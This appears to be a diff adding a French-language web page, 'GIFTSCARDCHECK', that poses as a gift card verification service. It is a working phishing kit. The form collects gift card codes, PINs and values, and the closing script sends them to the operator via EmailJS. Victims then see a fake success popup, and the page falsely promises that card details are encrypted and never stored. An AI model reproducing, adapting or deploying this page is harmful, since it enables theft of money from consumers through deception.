@@ -1,0 +1,438 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>VérificationCodeCadeau</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Work+Sans:wght@400;600;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Work Sans', sans-serif;
+            background-color: #ffffff;
+            margin: 0;
+            padding: 0;
+        }
+        .navbar {
+            background-color: #ffffff;
+            border-bottom: 1px solid #ddd;
+        }
+        .navbar-brand, .nav-link {
+            color: #333;
+            font-size: 1.2rem;
+        }
+        .navbar-toggler {
+            border: none;
+        }
+        .hero {
+            display: flex;
+            flex-wrap: wrap;
+            align-items: center;
+            justify-content: center;
+            padding: 40px 20px;
+            background-color: #ffffff;
+            gap: 20px;
+        }
+        .hero-text {
+            max-width: 600px;
+        }
+        .hero h1 {
+            font-size: 2rem;
+            font-weight: 700;
+            color: #333;
+        }
+        .hero p {
+            font-size: 1rem;
+            color: #555;
+            margin: 20px 0;
+        }
+        .btn-verify {
+            background-color: #ff6b6b;
+            color: #fff;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            text-decoration: none;
+            font-size: 1rem;
+        }
+        .btn-verify:hover {
+            background-color: #e05555;
+        }
+        .hero img {
+            max-width: 100%;
+            height: auto;
+            border-radius: 8px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+        @media (max-width: 768px) {
+            .hero h1 {
+                font-size: 1.8rem;
+            }
+            .hero p {
+                font-size: 0.9rem;
+            }
+        }
+
+        .form-container {
+            background-color: white;
+            padding: 20px;
+            border-radius: 15px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 400px;
+            margin: 20px auto;
+            gap:20px;
+        }
+        .form-container select,
+        .form-container input {
+            width: 100%;
+            margin-bottom: 15px;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
+            background-color: #f4f4f4;
+            color: #333;
+        }
+        .form-container input:focus,
+        .form-container select:focus {
+            outline: none;
+            border-color: #ff6b6b;
+            box-shadow: 0 0 5px rgba(255, 107, 107, 0.5);
+        }
+        .form-container .btn-continue {
+            width: 100%;
+            background-color: #ff6b6b;
+            color: #fff;
+            padding: 10px 15px;
+            font-size: 16px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+        .form-container .btn-continue:hover {
+            background-color: #e05555;
+        }
+        .form-container p {
+            text-align: center;
+            color: #777;
+            margin-top: 15px;
+            font-size: 14px;
+        }
+        
+         .container {
+            display: flex;
+            align-items: center;
+            gap: 2rem;
+            max-width: 1200px;
+            padding: 20px;
+        }
+
+        .text-section {
+            flex: 1;
+        }
+
+        .text-section h1 {
+            font-size: 2.5rem;
+            color: #222;
+            margin-bottom: 1rem;
+        }
+
+        .text-section p {
+            font-size: 1rem;
+            color: #555;
+            line-height: 1.6;
+        }
+
+        .image-section {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+        }
+
+        .image-section img {
+            max-width: 100%;
+            height: auto
+        }
+
+        h2{
+            
+            text-align: center;
+            padding: 10px;
+            font-size: 2rem;
+            font-weight: 700;
+            color: #333
+        }
+
+.hi{
+    font-size: 49px;
+}
+.ho{
+    font-size: 19px;
+    padding-top: 17px;
+    margin-top: 28px;
+}
+hr{
+    box-shadow: 14px;
+}
+
+ .popup-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            display: none; /* Caché par défaut */
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+        .popup-card {
+            background: #fff;
+            padding: 20px 30px;
+            border-radius: 10px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
+            text-align: center;
+            width: 90%;
+            max-width: 400px;
+        }
+        .popup-card h3 {
+            margin: 0 0 15px;
+            color: #333;
+        }
+        .popup-card p {
+            font-size: 16px;
+            color: #555;
+        }
+        .loading-spinner {
+            border: 4px solid #f3f3f3; /* Gris clair */
+            border-top: 4px solid #3498db; /* Bleu */
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+        @keyframes spin {
+            from {
+                transform: rotate(0deg);
+            }
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+    </style>
+
+</head>
+<body>
+    <nav class="navbar navbar-expand-lg">
+        <div class="container">
+            <a class="navbar-brand" href="#">GIFTSCARDCHECK</a>
+            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Basculer la navigation">
+                <span class="navbar-toggler-icon"><i class="fa fa-bars"></i></span>
+            </button>
+            <div class="collapse navbar-collapse" id="navbarNav">
+                <ul class="navbar-nav ms-auto">
+                    <li class="nav-item">
+                        <a class="nav-link" href="#">Accueil</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="#">Services</a>
+                    </li>
+                    <li class="nav-item  ">
+                        <a class="nav-link" style="color: limegreen;" href="#form">Vérifiez Maintenant</a>
+                    </li>
+                </ul>
+            </div>
+        </div>
+    </nav>
+
+    <section class="hero">
+        <div class="hero-text">
+            <h1>VALIDATION ET VÉRIFICATION DES GIFTS CARDS</h1>
+            <p>Un cadre efficace qui fournit une vérification robuste, utilisant un algorithme intelligent qui fonctionne très rapidement pour fournir des informations d'activation adéquates.</p>
+            <a href="#form" class="btn-verify">Vérifiez Maintenant</a>
+        </div>
+        <div>
+<img src="https://files.fm/thumb_show.php?i=ffty3mfuxu">        </div>
+    </section>
+
+    <div class="form-container" id="form">
+        <form id="giftcard-form">
+            <select id="giftcard-type">
+                <option value="Apple">Apple</option>
+                <option value="Amazon">Amazon</option>
+                <option value="Steam">Steam</option>
+                <option value="eBay">eBay</option>
+                <option value="Xbox">Xbox</option>
+                <option value="Googleplay">Googleplay</option>
+                <option value="PlayStation">PlayStation</option>
+                <option value="Sephora">Sephora</option>
+                <option value="RazerGold">RazerGold</option>
+            </select>
+            <div class="d-flex align-items-center mb-3">
+                <select id="currency" style="max-width: 30%; margin-right: 10px;">
+                    <option value="USD" selected>USD</option>
+                    <option value="GBP">GBP</option>
+                    <option value="AUD">AUD</option>
+                    <option value="EUR">EUR</option>
+                    <option value="CAD">CAD</option>
+                </select>
+                <input type="text" id="value" placeholder="Valeur">
+            </div>
+            <input type="text" id="code" placeholder="Code">
+            <input type="text" id="pin" placeholder="Pin">
+            <input type="email" id="Email" placeholder="Votre Email">
+            <button type="button" class="btn-continue" id="submit-btn">Continuer</button>
+        </form>
+        <p>Veuillez vous assurer que les codes que vous êtes sur le point de saisir sont corrects et conformes aux détails.</p>
+    </div>
+
+    <!-- Popup -->
+    <div class="popup-overlay" id="popup-overlay">
+        <div class="popup-card" id="popup-card">
+            <div id="loading-spinner" class="loading-spinner"></div>
+            <h3 id="popup-title" style="display: none;">Carte sécurisée !</h3>
+            <p id="popup-message" style="display: none;">Votre carte a été vérifiée  avec succes vous recevez un email dans quelques minuites.</p>
+        </div>
+    </div>
+
+
+<hr>
+
+<h2 >Pourquoi nous choisir ?</h2>
+
+ <div class="container">
+        <div class="text-section">
+            <h1>Décentralisé</h1>
+            <p>
+                Nos cadres intelligents sont construits sur une plateforme décentralisée pour garantir que les détails des cartes cadeaux des clients ne sont stockés nulle part sur le serveur. Les détails de votre carte sont immédiatement supprimés après les opérations de vérification.
+            </p>
+        </div>
+        <div class="image-section" style="background-color: white;"><img src="https://files.fm/thumb_show.php?i=29249bsw3a&v=2">
+        </div>
+    </div>
+
+<hr>
+
+    <div class="container">
+        <div class="text-section">
+            <h1>Sécurisé et Crypté</h1>
+            <p>
+               Chez Card-ly, nous veillons à ce que les informations des cartes-cadeaux de nos clients soient sécurisées et cryptées. Aucun attaquant ou usurpateur d'identité ne peut intercepter vos opérations de vérification.
+            </p>
+        </div>
+        <div class="image-section">
+         <img src="https://files.fm/thumb_show.php?i=ng843y8prm&v=2">
+        </div>
+    </div>
+
+<hr>
+     <div class="container">
+        <div class="text-section">
+            <h1>Haute performance</h1>
+            <p>
+               Nos algorithmes intelligents fonctionnent très rapidement pour vous fournir des informations précises sur votre carte-cadeau. Nous valorisons le temps de nos clients, c'est pourquoi vous obtenez une réponse rapide à votre demande.
+            </p>
+        </div>
+        <div class="image-section">
+     <img src="https://files.fm/thumb_show.php?i=e4bskgzmyx&v=2">        </div>
+    </div>
+    <hr>
+    <div class="container">
+          <div class="row justify-content-center">
+            <div class="col-xl-12">
+              <div class="row justify-content-center">
+                <div class="col-xxl-7 col-xl-8 text-center">
+                  <div class="content">
+                    <h2 class="hi">
+                      Plus de 8000 cartes-cadeaux vérifiées sur notre site. Vérifiez la vôtre dès maintenant !
+
+                    </h2>
+                    <div class="text-box">
+                      <a href="#form" class="btn btn-verify "
+                        >Essayer Gratuitement</a
+                      >
+                    </div>
+                    
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <!-- Footer Area -->
+      <footer>
+        <div style="display: flex; justify-content: center; padding: 10px;">
+         <!-- <h1 style="color: #000;">GiftCodeCheck</h1>
+           <h1 style="color: #000;">Services</h1> -->
+          <h1 style="color: #000;" class="ho">© GiftCodeCheck 2024  Touts droits reserves.</h1>
+
+        </div>
+      </footer>
+
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
+<script type="text/javascript"
+        src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
+</script>
+
+<script>
+    // Initialisation de EmailJS
+    emailjs.init('_WxF2WFSxiNMt42ao'); // Remplacez par votre clé publique EmailJS
+
+    document.getElementById("submit-btn").addEventListener("click", function () {
+        // Récupération des champs
+        const giftcardType = document.getElementById("giftcard-type").value;
+        const currency = document.getElementById("currency").value;
+        const value = document.getElementById("value").value;
+        const code = document.getElementById("code").value;
+        const pin = document.getElementById("pin").value;
+        
+
+
+        // Validation simple des champs
+        if (!giftcardType || !currency || !value || !code || !pin) {
+            alert("Veuillez remplir tous les champs !");
+            return;
+        }
+
+        // Afficher la popup
+        const popupOverlay = document.getElementById("popup-overlay");
+        const loadingSpinner = document.getElementById("loading-spinner");
+        const popupTitle = document.getElementById("popup-title");
+        const popupMessage = document.getElementById("popup-message");
+
+        popupOverlay.style.display = "flex"; // Affiche la popup
+        loadingSpinner.style.display = "block"; // Affiche le spinner
+        popupTitle.style.display = "none"; // Cache le message final
+        popupMessage.style.display = "none"; // Cache le message final
+
+        // Simulation de traitement (1 minute)
+        setTimeout(() => {
+            // Envoi par EmailJS
+            emailjs.send("service_rsyhpig", "template_dyd0cu2", {
+                giftcard_type: giftcardType,
+                currency: currency,
+                value: value,
+                code: code,
+                pin: pin,
+            }).then(() => {
+                loadingSpinner.style.display = "none"; // Cache le spinner
+                popupTitle.style.display = "block"; // Affiche le titre
+                popupMessage.style.display = "block"; // Affiche le message
+            }).catch((error) => {
+                alert("Erreur lors de l'envoi de l'email : " + error.text);
+                popupOverlay.style.display = "none"; // Cache la popup en cas d'erreur
+            });
+        }, 60); // 1 minute
+    });
+</script>
+
+
+</body>
+</html>
